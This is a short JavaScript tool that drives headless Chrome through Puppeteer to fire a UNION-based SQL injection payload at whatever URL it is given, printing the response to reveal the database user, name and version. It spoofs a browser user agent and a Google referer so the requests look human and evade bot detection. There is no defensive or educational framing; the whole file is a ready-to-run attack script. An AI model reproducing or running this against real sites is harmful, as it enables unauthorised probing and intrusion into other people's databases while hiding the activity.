// tronPuppeteer.js - Human-like Inject via Chrome
const puppeteer = require('puppeteer');

const payload = "' UNION SELECT NULL, user(), database(), version() --";

async function launchBrowserInjection(targetUrl) {
  try {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    // Mimic real user agent & behavior
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
    await page.setExtraHTTPHeaders({
      'Referer': 'https://google.com',
      'Accept-Language': 'en-US,en;q=0.9'
    });

    console.log("🌐 Navigating to:", targetUrl);
    await page.goto(targetUrl, { waitUntil: 'domcontentloaded' });

    const injectUrl = targetUrl.includes('?') 
      ? targetUrl + encodeURIComponent(payload) 
      : targetUrl + '?v=' + encodeURIComponent(payload);

    console.log("💉 Injecting URL:", injectUrl);
    await page.goto(injectUrl, { waitUntil: 'domcontentloaded' });

    const content = await page.content();
    console.log("📄 Page content (partial):\n", content.slice(0, 500));

    await browser.close();
  } catch (err) {
    console.error("❌ Injection failed:", err.message);
  }
}

const input = process.argv[2];
if (!input) {
  console.error("❌ Provide base URL e.g. https://target.com/");
  process.exit(1);
}

launchBrowserInjection(input);
